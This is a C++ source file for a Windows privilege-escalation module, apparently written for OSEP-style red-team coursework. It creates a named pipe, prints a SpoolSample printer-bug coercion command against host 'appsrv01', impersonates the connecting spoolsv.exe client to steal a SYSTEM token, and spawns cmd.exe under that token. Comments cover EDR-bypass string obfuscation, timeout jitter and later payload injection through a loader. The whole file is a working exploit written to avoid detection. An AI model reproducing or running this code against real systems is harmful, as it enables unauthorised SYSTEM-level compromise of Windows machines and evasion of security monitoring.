#include "seimpersonate.hpp"
#include <iostream>
#include <sddl.h>
#include <userenv.h>
#include <sstream>
#include <iomanip>
#include <random>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "rpcrt4.lib")

// STRINGS TO OBFUSCATE (see edr_strings.conf for EDR bypass)
// NOTE: These should be encrypted in production for OPSEC
// Currently plaintext for Phase 1 testing, will be encrypted in Phase 2

// Constructor
SeImpersonateHandler::SeImpersonateHandler(bool verboseMode)
    : verbose(verboseMode), waitTimeoutMs(30000) {
}

// Helper function to add jitter to timeout (±5 seconds around 25s base)
DWORD SeImpersonateHandler::GetTimeoutWithJitter() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(-5000, 5000);  // ±5 seconds in ms
    DWORD jitter = waitTimeoutMs + dis(gen);
    if (verbose) std::cout << "[*] Timeout with jitter: " << jitter << "ms\n";
    return jitter;
}

// Destructor - cleanup handles
SeImpersonateHandler::~SeImpersonateHandler() {
    if (hNamedPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(hNamedPipe);
        hNamedPipe = INVALID_HANDLE_VALUE;
    }
    if (hPipeEvent != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipeEvent);
        hPipeEvent = INVALID_HANDLE_VALUE;
    }
    if (hTriggerThread != INVALID_HANDLE_VALUE) {
        CloseHandle(hTriggerThread);
        hTriggerThread = INVALID_HANDLE_VALUE;
    }
}

/**
 * Main execution function
 * Orchestrates the escalation chain: pipe creation -> wait -> impersonation -> return token
 *
 * DOES NOT spawn processes (loader does that)
 * DOES NOT handle payload injection (ProcessInjection class does that)
 * This keeps the module focused: just escalate and return token
 */
bool SeImpersonateHandler::Execute(HANDLE& outSystemToken) {
    // Note: We don't check SeImpersonate privilege explicitly (OPSEC: avoid unnecessary API calls)
    // The exploitation either works (token obtained) or fails (detection by WaitForPipeConnection timeout)
    // One-shot: Success is visible in the result, failure is visible in timeout

    // Step 1: Generate random pipe name (UUID-based, OPSEC-safe, not hardcoded 'test')
    if (!GenerateRandomPipeName(pipeName)) {
        std::cerr << "[-] Failed to generate random pipe name\n";
        return false;
    }
    if (verbose) {
        std::cout << "[*] Generated random pipe name (UUID):\n"
                  << "    " << pipeName << "\n";
    }

    // Step 2: Create named pipe server
    if (!CreatePipeServer(pipeName)) {
        std::cerr << "[-] Failed to create named pipe server\n";
        return false;
    }
    std::cout << "[+] Named pipe listening...\n";

    // Step 3: Display trigger instructions (external SpoolSample for Phase 1)
    if (verbose) std::cout << "[*] Printer bug trigger instructions:\n";
    if (!TriggerPrinterBugExternal(pipeName)) {
        if (verbose) std::cerr << "[-] Warning: Failed to output trigger instructions\n";
    }

    // Step 4: Wait for connection from SYSTEM (spoolsv.exe) with jitter timeout
    DWORD actualTimeout = GetTimeoutWithJitter();
    if (verbose) std::cout << "[*] Waiting for spoolsv.exe connection (timeout: " << actualTimeout << "ms)...\n";

    // Step 5: Wait for connection from SYSTEM (spoolsv.exe)
    if (!WaitForPipeConnection(actualTimeout)) {
        std::cerr << "[-] Timeout or error waiting for pipe connection\n";
        if (verbose) std::cerr << "[-] spoolsv.exe did not connect within " << actualTimeout << "ms\n";
        return false;
    }
    std::cout << "[+] Connection received on named pipe!\n";

    // Step 5: Impersonate the connected client (should be SYSTEM)
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    if (!ImpersonateAndGetToken(hNamedPipe, hSystemToken)) {
        std::cerr << "[-] ImpersonateNamedPipeClient() failed\n";
        if (verbose) std::cerr << "[-] Error: " << GetLastError() << "\n";
        return false;
    }
    std::cout << "[+] Token impersonated successfully\n";

    // Verify we got SYSTEM token (check SID - OSEP/course requirement)
    std::wstring tokenSID;
    if (GetTokenSID(hSystemToken, tokenSID)) {
        std::string sidStr(tokenSID.begin(), tokenSID.end());
        std::cout << "[+] Token User SID:\n"
                  << "    " << sidStr << "\n";

        if (sidStr.find("S-1-5-18") != std::string::npos) {
            std::cout << "[+] Confirmed: SYSTEM (NT AUTHORITY\\SYSTEM)\n";
        } else if (verbose) {
            std::cout << "[!] Warning: Not SYSTEM, got: " << sidStr << "\n";
        }
    } else if (verbose) {
        std::cerr << "[-] Failed to get token SID\n";
    }

    // Step 6: Return the SYSTEM token to caller
    // Caller (loader.cpp) will use this token for injection
    outSystemToken = hSystemToken;

    return true;
}

/**
 * Generate random UUID-based pipe name (OPSEC-safe, not hardcoded like 'test')
 * Uses RPC UUID generation for cryptographically random names
 */
bool SeImpersonateHandler::GenerateRandomPipeName(std::string& outName) {
    UUID uuid;
    RPC_STATUS status = UuidCreate(&uuid);
    if (status != RPC_S_OK) {
        if (verbose) std::cerr << "[-] UuidCreate() failed: " << status << "\n";
        return false;
    }

    unsigned char* pszUuid = nullptr;
    status = UuidToStringA(&uuid, &pszUuid);
    if (status != RPC_S_OK) {
        if (verbose) std::cerr << "[-] UuidToStringA() failed: " << status << "\n";
        return false;
    }

    if (!pszUuid) {
        if (verbose) std::cerr << "[-] UuidToStringA() returned NULL\n";
        return false;
    }

    outName = reinterpret_cast<const char*>(pszUuid);
    RpcStringFreeA(&pszUuid);

    return true;
}

/**
 * Create named pipe server with proper security attributes
 * Name format: \\.\pipe\[RANDOM]\pipe\spoolss
 *
 * Path normalization trick (from OSEP 16.2.2):
 * Attacker request: \\[hostname]/pipe/[RANDOM]
 * Gets normalized to: \\[hostname]\[RANDOM]\pipe\spoolss
 * Attacker creates: \\.\pipe\[RANDOM]\pipe\spoolss
 * Spooler connects to our pipe due to normalization
 */
bool SeImpersonateHandler::CreatePipeServer(const std::string& pipeName) {
    // Build full pipe path using local pipe notation (.\\pipe\\)
    std::string pipePath = "\\\\?\\pipe\\" + pipeName + "\\pipe\\spoolss";

    if (verbose) {
        std::cout << "[*] CreateNamedPipe() details:\n"
                  << "    Pipe name: \\\\\\.\\pipe\\" << pipeName << "\\pipe\\spoolss\n"
                  << "    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED\n"
                  << "    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT\n"
                  << "    Max instances: 10\n"
                  << "    Buffer sizes: 2048 bytes (in/out)\n";
    }

    // Convert to wide string
    int wideLen = MultiByteToWideChar(CP_ACP, 0, pipePath.c_str(), -1, nullptr, 0);
    std::wstring widePipePath(wideLen, 0);
    MultiByteToWideChar(CP_ACP, 0, pipePath.c_str(), -1, &widePipePath[0], wideLen);

    // Security descriptor: Allow Everyone access (D:(A;OICI;GA;;;WD))
    SECURITY_ATTRIBUTES sa = {};
    SECURITY_DESCRIPTOR sd = {};

    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
        if (verbose) std::cerr << "[-] InitializeSecurityDescriptor() failed: " << GetLastError() << "\n";
        return false;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:(A;OICI;GA;;;WD)",
        SDDL_REVISION_1,
        &sa.lpSecurityDescriptor,
        nullptr)) {
        if (verbose) std::cerr << "[-] ConvertStringSecurityDescriptorToSecurityDescriptor() failed: " << GetLastError() << "\n";
        return false;
    }

    // Create the named pipe with async/overlapped mode
    hNamedPipe = CreateNamedPipeW(
        widePipePath.c_str(),
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,  // Async I/O
        PIPE_TYPE_BYTE | PIPE_WAIT,                  // Byte mode, blocking
        10,                                           // Max instances
        2048,                                         // Output buffer
        2048,                                         // Input buffer
        0,                                            // Default timeout
        &sa
    );

    if (hNamedPipe == INVALID_HANDLE_VALUE) {
        DWORD dwError = GetLastError();
        std::cerr << "[-] CreateNamedPipeW() failed\n";
        if (verbose) std::cerr << "[-] Error code: " << dwError << "\n";
        return false;
    }

    if (verbose) std::cout << "[+] CreateNamedPipeW() successful\n"
                           << "    Pipe handle: 0x" << std::hex << (DWORD_PTR)hNamedPipe << std::dec << "\n";

    return true;
}

/**
 * Wait for connection on named pipe with timeout
 * Uses event-based async I/O (OVERLAPPED structure)
 */
bool SeImpersonateHandler::WaitForPipeConnection(DWORD timeoutMs) {
    OVERLAPPED ol = {};

    // Create event for async notification
    hPipeEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (!hPipeEvent) {
        if (verbose) std::cerr << "[-] CreateEvent() failed: " << GetLastError() << "\n";
        return false;
    }

    ol.hEvent = hPipeEvent;

    // Try to connect (async)
    if (!ConnectNamedPipe(hNamedPipe, &ol)) {
        DWORD err = GetLastError();
        if (err != ERROR_IO_PENDING) {
            if (verbose) std::cerr << "[-] ConnectNamedPipe() failed: " << err << "\n";
            return false;
        }
    }

    // Wait for connection or timeout
    DWORD dwWait = WaitForSingleObject(hPipeEvent, timeoutMs);
    if (dwWait != WAIT_OBJECT_0) {
        if (verbose) std::cerr << "[-] Timeout waiting for pipe connection\n";
        return false;
    }

    return true;
}

/**
 * Impersonate the named pipe client and get a handle to their token
 * This is called AFTER the pipe connection is established
 */
bool SeImpersonateHandler::ImpersonateAndGetToken(HANDLE hPipe, HANDLE& hOutToken) {
    // Impersonate the client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        if (verbose) std::cerr << "[-] ImpersonateNamedPipeClient() failed: " << GetLastError() << "\n";
        return false;
    }

    // Open the impersonation token from current thread
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hOutToken)) {
        if (verbose) std::cerr << "[-] OpenThreadToken() failed: " << GetLastError() << "\n";
        RevertToSelf();
        return false;
    }

    // Revert impersonation (we have the token handle now)
    RevertToSelf();

    return true;
}

/**
 * Convert impersonation token to primary token for process creation
 * Impersonation tokens can't be used with CreateProcessAsUser
 */
bool SeImpersonateHandler::DuplicateTokenToPrimary(HANDLE hImpersonationToken, HANDLE& hOutPrimaryToken) {
    if (!DuplicateTokenEx(
        hImpersonationToken,
        TOKEN_ALL_ACCESS,
        nullptr,
        SecurityImpersonation,
        TokenPrimary,
        &hOutPrimaryToken)) {
        if (verbose) std::cerr << "[-] DuplicateTokenEx() failed: " << GetLastError() << "\n";
        return false;
    }
    return true;
}

/**
 * Spawn a new process using the SYSTEM token
 * Creates cmd.exe by default for testing, can be extended for payload execution
 */
bool SeImpersonateHandler::SpawnProcessWithToken(HANDLE hSystemToken, DWORD& outProcessId) {
    // First, convert impersonation token to primary token
    HANDLE hPrimaryToken = INVALID_HANDLE_VALUE;
    if (!DuplicateTokenToPrimary(hSystemToken, hPrimaryToken)) {
        return false;
    }

    // Prepare environment block
    LPVOID lpEnvironment = nullptr;
    if (!CreateEnvironmentBlock(&lpEnvironment, hPrimaryToken, FALSE)) {
        if (verbose) std::cerr << "[-] CreateEnvironmentBlock() failed: " << GetLastError() << "\n";
        CloseHandle(hPrimaryToken);
        return false;
    }

    // Get system directory for current directory
    wchar_t szSystemDir[MAX_PATH] = {};
    if (!GetSystemDirectoryW(szSystemDir, MAX_PATH)) {
        if (verbose) std::cerr << "[-] GetSystemDirectory() failed: " << GetLastError() << "\n";
        DestroyEnvironmentBlock(lpEnvironment);
        CloseHandle(hPrimaryToken);
        return false;
    }

    // Setup startup info
    STARTUPINFOW si = {};
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default");
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // Process info structure
    PROCESS_INFORMATION pi = {};

    // Try CreateProcessAsUser first (preferred)
    wchar_t cmdLine[] = L"cmd.exe";
    BOOL result = CreateProcessAsUserW(
        hPrimaryToken,
        nullptr,
        cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
        lpEnvironment,
        szSystemDir,
        &si,
        &pi
    );

    if (!result) {
        DWORD err = GetLastError();
        if (verbose) std::cerr << "[-] CreateProcessAsUserW() failed: " << err << "\n";

        // Fallback to CreateProcessWithTokenW if privilege issue
        if (err == ERROR_PRIVILEGE_NOT_HELD) {
            if (verbose) std::cout << "[!] Retrying with CreateProcessWithTokenW()...\n";

            result = CreateProcessWithTokenW(
                hPrimaryToken,
                LOGON_WITH_PROFILE,
                nullptr,
                cmdLine,
                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                lpEnvironment,
                szSystemDir,
                &si,
                &pi
            );

            if (!result) {
                if (verbose) std::cerr << "[-] CreateProcessWithTokenW() also failed: " << GetLastError() << "\n";
                DestroyEnvironmentBlock(lpEnvironment);
                CloseHandle(hPrimaryToken);
                return false;
            }
        } else {
            DestroyEnvironmentBlock(lpEnvironment);
            CloseHandle(hPrimaryToken);
            return false;
        }
    }

    // Success
    outProcessId = pi.dwProcessId;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DestroyEnvironmentBlock(lpEnvironment);
    CloseHandle(hPrimaryToken);

    return true;
}

/**
 * Trigger printer bug externally (Phase 1 - external SpoolSample)
 * Displays instructions for attacker to trigger RPC coercion
 * Based on OSEP 16.2.2 course material
 * Phase 2 will use embedded DLL to trigger internally
 */
bool SeImpersonateHandler::TriggerPrinterBugExternal(const std::string& pipeName) {
    std::cout << "\n";
    std::cout << "========== RPC COERCION - SPOOLSAMPLE TRIGGER ==========\n";
    std::cout << "Run this command from attacker machine:\n\n";
    std::cout << "SpoolSample.exe appsrv01 appsrv01/pipe/" << pipeName << "\n\n";
    std::cout << "Details:\n";
    std::cout << "  - Target: appsrv01\n";
    std::cout << "  - Pipe: \\\\appsrv01\\pipe\\" << pipeName << "\n";
    std::cout << "  - Triggers: RpcOpenPrinter() -> RpcRemoteFindFirstPrinterChangeNotificationEx()\n";
    std::cout << "  - spoolsv.exe (SYSTEM) will connect to our named pipe\n";
    std::cout << "  - We impersonate and steal SYSTEM token\n";
    std::cout << "==========================================================\n\n";
    return true;
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

std::string BytesToHex(const uint8_t* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << static_cast<int>(data[i]);
    }
    return ss.str();
}

bool GetTokenSID(HANDLE hToken, std::wstring& outSID) {
    DWORD dwLength = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLength);

    if (dwLength == 0) {
        return false;
    }

    PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(malloc(dwLength));
    if (!pTokenUser) {
        return false;
    }

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
        free(pTokenUser);
        return false;
    }

    LPWSTR pszSID = nullptr;
    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &pszSID)) {
        free(pTokenUser);
        return false;
    }

    outSID = pszSID;
    LocalFree(pszSID);
    free(pTokenUser);
    return true;
}
